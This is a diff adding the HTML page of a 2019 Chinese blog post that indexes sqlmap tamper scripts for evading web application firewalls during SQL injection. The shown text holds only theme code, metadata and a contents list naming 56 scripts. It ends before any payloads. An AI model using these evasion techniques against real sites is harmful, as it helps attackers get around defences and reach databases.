@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+    <link rel="dns-prefetch" href="https://cache-1253916356.file.myqcloud.com/source">
+
+
+    <link rel="dns-prefetch" href="https://cdn1.lncld.net">
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            sqlmap tamper规则速查 | 
+        
+        AresX&#39;s Blog
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
+    <link rel="icon" href="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no">
+    <meta name="description" itemprop="description" content="There is no description">
+    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,sqlmap">
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","https://cache-1253916356.file.myqcloud.com/source/css/material.min.css",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","https://cache-1253916356.file.myqcloud.com/source/css/style.min.css",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","https://cache-1253916356.file.myqcloud.com/source/css/prettify.min.css",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","https://cache-1253916356.file.myqcloud.com/source/css/prettify/hemisu-dark.min.css",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #363636;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #D3D3D3 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #D3D3D3 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #D3D3D3 !important;
+  }
+
+  .toTop {
+    background: #D3D3D3 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #D3D3D3;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #D3D3D3;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #D3D3D3;
+  }
+
+  .post-toc a:hover {
+    color: #363636;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-image: url(https://cache-1253916356.file.myqcloud.com/img/bg.jpg);
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","https://cache-1253916356.file.myqcloud.com/source/css/material-icons.css",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","https://cache-1253916356.file.myqcloud.com/source/js/jquery.min.js", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="AresX&#39;s Blog">
+    <meta name="msapplication-starturl" content="https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="AresX&#39;s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
+
+    <!-- Site Verification -->
+    <meta name="google-site-verification" content="rVqEDFDRIznSgfyvSoh7KIxfhwh6uxZtvgO_Vxr-QDs">
+    <meta name="baidu-site-verification" content="w6yasXXGYf">
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="sqlmap tamper规则速查 | AresX&#39;s Blog">
+    <meta property="og:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
+    <meta property="og:description" content="There is no description">
+    <meta property="og:article:tag" content="sqlmap"> 
+
+    
+        <meta property="article:published_time" content="Wed May 01 2019 16:44:36 GMT+0800">
+        <meta property="article:modified_time" content="Thu May 02 2019 00:38:06 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html">
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html",
+    "headline": "sqlmap tamper规则速查",
+    "datePublished": "Wed May 01 2019 16:44:36 GMT+0800",
+    "dateModified": "Thu May 02 2019 00:38:06 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "AresX",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://cache-1253916356.file.myqcloud.com/img/aresx.png"
+        },
+        "description": "Anarchy is the key"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "AresX&#39;s Blog",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "https://cache-1253916356.file.myqcloud.com/img/favicon.png"
+        }
+    },
+    "keywords": ",sqlmapAresX&#39;s Blog,AresX,Aresx 博客",
+    "description": "There is no description",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+        
+            <audio id="bgm" autoplay="autoplay" loop="loop" src="https://cache-1253916356.file.myqcloud.com/Black%20Lab%20-%20This%20Night.mp3"></audio>
+        
+    
+
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn" class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Sqlmap-Tamper规则提取"><span class="post-toc-number">1.</span> <span class="post-toc-text">Sqlmap Tamper规则提取:</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x2char-py"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">0x2char.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#apostrophemask-py"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">apostrophemask.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#apostrophenullencode-py"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">apostrophenullencode.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#appendnullbyte-py"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">appendnullbyte.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#base64encode-py"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">base64encode.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#between-py"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">between.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#bluecoat-py"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">bluecoat.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#chardoubleencode-py"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">chardoubleencode.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#charencode-py"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">charencode.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#charunicodeencode-py"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">charunicodeencode.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#charunicodeescape-py"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">charunicodeescape.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#commalesslimit-py"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">commalesslimit.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#commalessmid-py"><span class="post-toc-number">1.13.</span> <span class="post-toc-text">commalessmid.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#commentbeforeparentheses-py"><span class="post-toc-number">1.14.</span> <span class="post-toc-text">commentbeforeparentheses.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#concat2concatws-py"><span class="post-toc-number">1.15.</span> <span class="post-toc-text">concat2concatws.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#equaltolike-py"><span class="post-toc-number">1.16.</span> <span class="post-toc-text">equaltolike.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#escapequotes-py"><span class="post-toc-number">1.17.</span> <span class="post-toc-text">escapequotes.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#greatest-py"><span class="post-toc-number">1.18.</span> <span class="post-toc-text">greatest.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#halfversionedmorekeywords-py"><span class="post-toc-number">1.19.</span> <span class="post-toc-text">halfversionedmorekeywords.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#htmlencode-py"><span class="post-toc-number">1.20.</span> <span class="post-toc-text">htmlencode.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ifnull2casewhenisnull-py"><span class="post-toc-number">1.21.</span> <span class="post-toc-text">ifnull2casewhenisnull.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ifnull2ifisnull-py"><span class="post-toc-number">1.22.</span> <span class="post-toc-text">ifnull2ifisnull.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#informationschemacomment-py"><span class="post-toc-number">1.23.</span> <span class="post-toc-text">informationschemacomment.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#least-py"><span class="post-toc-number">1.24.</span> <span class="post-toc-text">least.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#lowercase-py"><span class="post-toc-number">1.25.</span> <span class="post-toc-text">lowercase.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#luanginx-py"><span class="post-toc-number">1.26.</span> <span class="post-toc-text">luanginx.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#modsecurityversioned-py"><span class="post-toc-number">1.27.</span> <span class="post-toc-text">modsecurityversioned.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#modsecurityzeroversioned-py"><span class="post-toc-number">1.28.</span> <span class="post-toc-text">modsecurityzeroversioned.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#multiplespaces-py"><span class="post-toc-number">1.29.</span> <span class="post-toc-text">multiplespaces.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#overlongutf8-py"><span class="post-toc-number">1.30.</span> <span class="post-toc-text">overlongutf8.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#overlongutf8more-py"><span class="post-toc-number">1.31.</span> <span class="post-toc-text">overlongutf8more.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#percentage-py"><span class="post-toc-number">1.32.</span> <span class="post-toc-text">percentage.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#plus2concat-py"><span class="post-toc-number">1.33.</span> <span class="post-toc-text">plus2concat.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#plus2fnconcat-py"><span class="post-toc-number">1.34.</span> <span class="post-toc-text">plus2fnconcat.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#randomcase-py"><span class="post-toc-number">1.35.</span> <span class="post-toc-text">randomcase.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#randomcomments-py"><span class="post-toc-number">1.36.</span> <span class="post-toc-text">randomcomments.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2comment-py"><span class="post-toc-number">1.37.</span> <span class="post-toc-text">space2comment.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2dash-py"><span class="post-toc-number">1.38.</span> <span class="post-toc-text">space2dash.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2hash-py"><span class="post-toc-number">1.39.</span> <span class="post-toc-text">space2hash.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2morecomment-py"><span class="post-toc-number">1.40.</span> <span class="post-toc-text">space2morecomment.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2morehash-py"><span class="post-toc-number">1.41.</span> <span class="post-toc-text">space2morehash.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2mssqlblank-py"><span class="post-toc-number">1.42.</span> <span class="post-toc-text">space2mssqlblank.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2mssqlhash-py"><span class="post-toc-number">1.43.</span> <span class="post-toc-text">space2mssqlhash.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2mysqlblank-py"><span class="post-toc-number">1.44.</span> <span class="post-toc-text">space2mysqlblank.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2mysqldash-py"><span class="post-toc-number">1.45.</span> <span class="post-toc-text">space2mysqldash.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2plus-py"><span class="post-toc-number">1.46.</span> <span class="post-toc-text">space2plus.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#space2randomblank-py"><span class="post-toc-number">1.47.</span> <span class="post-toc-text">space2randomblank.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sp-password-py"><span class="post-toc-number">1.48.</span> <span class="post-toc-text">sp_password.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#symboliclogical-py"><span class="post-toc-number">1.49.</span> <span class="post-toc-text">symboliclogical.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unionalltounion-py"><span class="post-toc-number">1.50.</span> <span class="post-toc-text">unionalltounion.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unmagicquotes-py"><span class="post-toc-number">1.51.</span> <span class="post-toc-text">unmagicquotes.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#uppercase-py"><span class="post-toc-number">1.52.</span> <span class="post-toc-text">uppercase.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#varnish-py"><span class="post-toc-number">1.53.</span> <span class="post-toc-text">varnish.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#versionedkeywords-py"><span class="post-toc-number">1.54.</span> <span class="post-toc-text">versionedkeywords.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#versionedmorekeywords-py"><span class="post-toc-number">1.55.</span> <span class="post-toc-text">versionedmorekeywords.py:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#xforwardedfor-py"><span class="post-toc-number">1.56.</span> <span class="post-toc-text">xforwardedfor.py:</span></a></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', 'https://cache-1253916356.file.myqcloud.com/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                sqlmap tamper规则速查
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="Author Avatar">
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>AresX</strong>
+        <span>5月 01, 2019</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/sqlmap/">sqlmap</a>
+    </li></ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=sqlmap tamper规则速查&url=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html&pic=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=sqlmap tamper规则速查&url=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html&via=AresX" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
